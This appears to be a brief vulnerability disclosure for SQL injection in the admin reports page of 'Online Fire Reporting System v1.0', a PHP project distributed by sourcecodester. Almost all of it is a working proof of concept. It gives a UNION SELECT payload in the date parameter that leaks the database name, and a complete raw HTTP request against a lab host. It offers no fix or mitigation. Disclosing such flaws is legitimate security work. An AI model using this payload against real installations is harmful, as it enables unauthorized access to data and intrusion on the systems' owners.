# Online Fire Reporting System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15346/online-fire-reporting-system-phpoop-free-source-code.html

Vulnerability File: /ofrs/admin/?page=reports&date=

Vulnerability location: /ofrs/admin/?page=reports&date=, date

[+] Payload: /ofrs/admin/?page=reports&date=2022-05-27%27%20union%20select%201,2,3,database(),5,6,7,8,9,10--+ // Leak place ---> date

```sql
GET /ofrs/admin/?page=reports&date=2022-05-27%27%20union%20select%201,2,3,database(),5,6,7,8,9,10--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/170816699-225a705e-a75d-49a6-aa11-c92f9ccb0f1a.png)

![image](https://user-images.githubusercontent.com/54017627/170816660-55eafa66-cfb3-4ccf-934c-a5fedba6bff4.png)
